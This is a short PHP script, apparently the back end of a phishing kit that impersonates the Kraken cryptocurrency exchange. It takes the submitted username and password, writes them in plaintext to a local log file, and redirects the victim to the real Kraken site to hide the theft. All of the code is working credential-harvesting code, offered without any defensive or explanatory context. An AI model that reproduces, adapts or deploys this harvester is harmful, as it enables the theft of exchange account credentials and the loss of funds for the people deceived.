<?php
// File: logins.php

// Log file to save login attempts
$logFile = "logins.txt";

// Ensure the file exists and is writable
if (!file_exists($logFile)) {
    file_put_contents($logFile, ""); // Create file if not exists
}

// Capture login details
$username = $_POST['username'] ?? 'Unknown User';
$password = $_POST['password'] ?? 'No Password';

// Log the login details
$logEntry = sprintf(
    "[%s] Username: %s, Password: %s\n",
    date("Y-m-d H:i:s"),
    $username,
    $password
);

file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// Redirect back or to a success page
header("Location: https://www.kraken.com/fr");
exit;
?>


